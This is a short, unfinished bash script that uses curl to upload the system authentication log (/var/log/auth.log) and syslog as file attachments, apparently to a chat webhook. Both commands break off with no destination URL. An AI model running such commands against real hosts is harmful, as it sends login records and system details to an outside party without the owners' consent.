#!/bin/bash

curl -F "payload_json={\"content\": \"Authentication file:\"}" \
     -F "file=@/var/log/auth.log" \


curl -F "payload_json={\"content\": \"Syslog file:\"}" \
     -F "file=@/var/log/syslog" \
